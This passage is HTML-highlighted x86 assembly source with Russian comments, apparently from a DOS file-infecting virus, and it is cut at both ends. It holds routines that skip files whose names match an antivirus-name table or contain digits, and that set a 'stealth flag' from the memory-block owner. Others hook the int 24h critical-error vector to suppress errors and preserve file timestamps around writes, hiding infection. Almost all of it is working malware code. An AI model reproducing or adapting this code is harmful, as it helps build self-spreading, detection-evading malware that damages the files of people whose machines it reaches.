        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">extens</span><span class="sc0">       </span><span class="sc1">; ES:DI указывают на таблицу с</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compare</span><span class="sc0">         </span><span class="sc1">; разрешенными расширениями</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Bad_File</span><span class="sc0">        </span><span class="sc1">; некорректное расширение?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; SI -&gt; имя файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">AVs</span><span class="sc0">          </span><span class="sc1">; ES:DI -&gt; таблица с именами</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compare</span><span class="sc0">         </span><span class="sc1">; сравнение имен</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Bad_File</span><span class="sc0">        </span><span class="sc1">; неХоРошее имя</span><span class="sc0">

 </span><span class="sc5">digit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; проверяем, есть ли в имени файла цифры</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">nodig</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'9'</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">Bad_File</span><span class="sc0">
 </span><span class="sc5">nodig</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">digit</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">; очистка CF</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">Bad_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">; установка CF</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; установка байта STF в зависимости от текущего PSP/MCB</span><span class="sc0">
</span><span class="sc1">; байт равен 1 если текущий MCB принадлежит программе из STLOCK</span><span class="sc0">
</span><span class="sc1">; байт равен 0 если владелец текущего MB не зарегистрирован в STLOCK</span><span class="sc0">
</span><span class="sc1">; байт COMMAND равен 1 если текущий MB принадлежит command.com'у</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">mcbcheck</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">          </span><span class="sc1">; запрос сегмента текущего PSP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; получение сегмента MCB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; DS:SI указывают на владельца MB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">stlock</span><span class="sc0">       </span><span class="sc1">; ES:DI указывают на наш</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">; список имен STLOCK</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compare</span><span class="sc0">         </span><span class="sc1">; сравнение данных</span><span class="sc0">
        </span><span class="sc6">sete</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc0">          </span><span class="sc1">; установка стелс-флага</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">comspec</span><span class="sc0">      </span><span class="sc1">; проверка владельца текущего</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compare</span><span class="sc0">         </span><span class="sc1">; блока на command.com</span><span class="sc0">
        </span><span class="sc6">sete</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">command</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; выход из подпрограммы</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; COMPARE - сравнение данных</span><span class="sc0">
</span><span class="sc1">; DS:SI - источник</span><span class="sc0">
</span><span class="sc1">; ES:DI - таблица (Data1,0,Data2,0,...,DataN,0,0)</span><span class="sc0">
</span><span class="sc1">; Выход: ZF = 1 в случае совпадения данных</span><span class="sc0">
</span><span class="sc1">; Регистр латинских букв значения не имеет</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; дублирование смещения источника</span><span class="sc0">

 </span><span class="sc5">data1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; восстановление смещения источника</span><span class="sc0">
 </span><span class="sc5">data2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; чтения байта источника</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; чтения байта таблицы</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; увеличение индексных регистров</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">upreg</span><span class="sc0">           </span><span class="sc1">; перевод символов в верхний регистр</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">; если в таблице образовался 0 =&gt;</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">equal</span><span class="sc0">           </span><span class="sc1">; =&gt; данные совпали</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">; иначе побайтное сравнение</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">data2</span><span class="sc0">           </span><span class="sc1">; если байты совпали, проверяем дальше</span><span class="sc0">

 </span><span class="sc5">data3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; быйты не совпали, берем следующее</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">data4</span><span class="sc0">           </span><span class="sc1">; поле</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">data3</span><span class="sc0">

 </span><span class="sc5">data4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; проверка на последнюю запись в</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">data1</span><span class="sc0">           </span><span class="sc1">; таблице</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; таблица кончилась: совпадений не найдено</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; очистка ZF</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; выход из подпрограммы</span><span class="sc0">

 </span><span class="sc5">equal</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; установка ZF</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; выход из подпрограммы</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; сохранение и загрузка регистров из стека</span><span class="sc0">
</span><span class="sc1">; FLAGS EAX BX CX DX SI DI BP ES DS</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">SaveRegs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">; сохранение самих регистров</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; копирование адреса возврата</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; восстановление BP</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">LoadRegs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">           </span><span class="sc1">; копирование адреса возврата в пустую</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ячейку стека (осталась от SaveRegs)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Gets a random value [0..AL]</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">get_rnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8405h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">random2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">rnd_exit</span><span class="sc0">

 </span><span class="sc5">rnd_fail</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">rnd_fail</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
 </span><span class="sc5">rnd_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; подпрограммы для установки/снятия вектора прерывания</span><span class="sc0">
</span><span class="sc1">; критических ошибок int 24h</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">Hook24</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение и перехват</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; вектора прерывания критических</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ошибок int 24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">int24</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io24</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io24</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">Remove24</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; восстановление вектора int 24h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io24</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io24</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; подпрограммы для работы с файлами</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">LFNOpenFile</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; LFN открытие файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">716ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; открытие файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; вернуть ошибку если не открывается</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; открытие файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">GetDate</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; получение времени и даты</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">; последней записи в файл</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">time</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">date</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">RestDate</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; восстановление времени и даты</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">        </span><span class="sc1">; файла</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">date</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">Write</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; запись в файл</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">Read</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">          </span><span class="sc1">; чтение из файла</span><span class="sc0">
